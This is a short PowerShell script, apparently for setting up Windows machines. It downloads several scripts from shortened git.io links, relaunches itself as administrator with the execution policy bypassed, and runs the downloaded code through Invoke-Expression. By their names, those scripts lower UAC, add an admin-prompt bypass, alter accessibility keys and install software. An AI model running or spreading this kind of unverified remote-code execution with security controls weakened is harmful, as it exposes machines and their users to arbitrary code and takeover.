$main = (New-Object System.Net.WebClient).DownloadString('https://git.io/Jrjhg')
$setLowUAC = (New-Object System.Net.WebClient).DownloadString('https://git.io/JoeeB')
$installPMSoftware = (New-Object System.Net.WebClient).DownloadString('https://git.io/Joevt')
$setRunAsAdministratorBypass = (New-Object System.Net.WebClient).DownloadString('https://git.io/JoNhe')
$setaccessibilitykeys = (New-Object System.Net.WebClient).DownloadString('https://git.io/J6y2C')

if (!$main -or !($setLowUAC -Or $installPMSoftware)) {
	throw "There is no script available"
}

# Relaunch the script in administrator mode if necessary
If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
	Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -NoExit -Command $main" -Verb RunAs
	Stop-Process -Id $PID
}

Invoke-Expression -Command $setLowUAC
Invoke-Expression -Command $setaccessibilitykeys
Invoke-Expression -Command $setRunAsAdministratorBypass
Invoke-Expression -Command $installPMSoftware